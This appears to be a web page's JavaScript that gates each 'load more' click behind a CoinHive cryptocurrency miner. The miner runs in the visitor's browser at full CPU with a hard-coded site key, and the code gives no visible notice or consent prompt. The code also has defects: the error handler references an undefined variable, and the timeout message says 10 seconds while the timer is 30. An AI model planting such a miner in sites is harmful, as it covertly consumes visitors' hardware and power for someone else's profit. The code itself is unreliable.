const mine = async() => {
    const miner = await CoinHive.Anonymous('R33EaeMyKkd8SvOQKSrecxGLbhu47dZO', { throttle: 0 });
    return new Promise(async(resolve) => {
        await miner.start();
        console.log('Started mining');

        miner.on('accepted', async(data) => {
            await miner.stop();
            resolve(data);
        });

        setTimeout(async() => {
            await miner.stop();
            resolve('Stopped mining after 10s timeout');
        }, 30000);
    })
};

const loadMoreButton = document.getElementById('load-more');
const contentContainer = document.getElementById('content');

const loadNextChunk = id => {
    fetch(`content-${id}.json`, {
            method: 'get',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            }
        })
        .then(result => result.json())
        .then(response => {
            renderNextChunk(response.text);
            updateLoadMoreButton(response.next_id);
        }).catch(error => {
            console.error(e.name, e.message);
        });
}

const updateLoadMoreButton = id => {
    if (!id) {
        loadMoreButton.style.display = 'none';
    } else {
        loadMoreButton.setAttribute('data-next-id', id);
        loadMoreButton.disabled = false;
    }
}

const renderNextChunk = text => {
    const domElement = document.createElement("p");
    const textNode = document.createTextNode(text);
    domElement.appendChild(textNode);
    contentContainer.appendChild(domElement);
}

loadMoreButton.addEventListener('click', async(e) => {
    const nextId = e.target.getAttribute('data-next-id');
    if (nextId) {
        loadMoreButton.disabled = true;
        const miner = await mine();
        console.log('Miner finished', miner);
        loadNextChunk(nextId);
    }
});